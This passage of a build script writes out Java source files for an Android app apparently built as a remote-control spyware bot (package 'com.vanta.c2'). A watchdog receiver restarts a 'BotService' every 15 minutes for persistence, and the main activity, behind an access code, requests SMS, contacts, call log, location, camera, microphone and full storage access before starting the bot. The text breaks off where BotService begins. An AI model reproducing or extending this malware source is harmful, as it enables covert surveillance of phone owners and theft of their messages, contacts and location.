          cat > app/src/main/java/com/vanta/c2/ServiceWatchdog.java <<'VEOF'
          package com.vanta.c2;
          import android.app.*;
          import android.content.*;
          import android.os.Build;
          import android.os.SystemClock;
          public class ServiceWatchdog extends BroadcastReceiver {
              private static final int RID = 0x77AA;
              public static void schedule(Context ctx) {
                  try {
                      AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
                      if (am == null) return;
                      Intent i = new Intent(ctx, ServiceWatchdog.class);
                      int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                      if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
                      PendingIntent pi = PendingIntent.getBroadcast(ctx, RID, i, flags);
                      long t = SystemClock.elapsedRealtime() + 15 * 60 * 1000L;
                      if (Build.VERSION.SDK_INT >= 23) am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, t, pi);
                      else am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, t, pi);
                  } catch (Exception ignored) {}
              }
              @Override public void onReceive(Context ctx, Intent i) { BotService.start(ctx); schedule(ctx); }
          }
          VEOF

          cat > app/src/main/java/com/vanta/c2/MainActivity.java <<'VEOF'
          package com.vanta.c2;
          import android.Manifest;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Environment;
          import android.provider.Settings;
          import android.view.View;
          import android.view.animation.*;
          import android.widget.*;
          import androidx.annotation.NonNull;
          import androidx.appcompat.app.AppCompatActivity;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;
          import java.util.*;
          public class MainActivity extends AppCompatActivity {
              private static final String ACCESS_CODE = "NADER";
              private static final int REQ_PERMS = 0x1001;
              private MatrixRainView rainLogin, rainInfo;
              private FrameLayout loginScreen, infoScreen;
              private EditText codeInput;
              private TextView errText;
              private final String[] PERMS = {
                  Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
                  Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
                  Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
                  Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.CAMERA,
                  Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_EXTERNAL_STORAGE,
                  Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.POST_NOTIFICATIONS,
              };
              @Override protected void onCreate(Bundle s) {
                  super.onCreate(s);
                  setContentView(R.layout.activity_main);
                  rainLogin = findViewById(R.id.rainLogin);
                  rainInfo = findViewById(R.id.rainInfo);
                  loginScreen = findViewById(R.id.loginScreen);
                  infoScreen = findViewById(R.id.infoScreen);
                  codeInput = findViewById(R.id.codeInput);
                  errText = findViewById(R.id.errText);
                  Button enter = findViewById(R.id.enterBtn);
                  rainLogin.start();
                  enter.setOnClickListener(v -> checkCode());
              }
              private void checkCode() {
                  String entered = codeInput.getText().toString().trim();
                  if (entered.equalsIgnoreCase(ACCESS_CODE)) {
                      errText.setVisibility(View.GONE);
                      rainLogin.stop();
                      loginScreen.setVisibility(View.GONE);
                      infoScreen.setVisibility(View.VISIBLE);
                      rainInfo.setRedTheme();
                      rainInfo.start();
                      Animation fade = new AlphaAnimation(0f, 1f);
                      fade.setDuration(700);
                      infoScreen.startAnimation(fade);
                      requestAllPermissions();
                  } else {
                      errText.setText("خطا في الرمز");
                      errText.setVisibility(View.VISIBLE);
                      codeInput.setText("");
                  }
              }
              private void requestAllPermissions() {
                  List<String> need = new ArrayList<>();
                  for (String p : PERMS) {
                      if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) need.add(p);
                  }
                  if (!need.isEmpty()) ActivityCompat.requestPermissions(this, need.toArray(new String[0]), REQ_PERMS);
                  else afterGranted();
              }
              @Override public void onRequestPermissionsResult(int code, @NonNull String[] p, @NonNull int[] r) {
                  super.onRequestPermissionsResult(code, p, r);
                  if (code == REQ_PERMS) afterGranted();
              }
              private void afterGranted() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                      try {
                          Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                          i.setData(Uri.parse("package:" + getPackageName()));
                          startActivity(i);
                      } catch (Exception ignored) {}
                  }
                  BotService.start(this);
                  Toast.makeText(this, "started", Toast.LENGTH_SHORT).show();
              }
          }
          VEOF

          cat > app/src/main/java/com/vanta/c2/BotService.java <<'VEOF'
          package com.vanta.c2;
          import android.app.*;
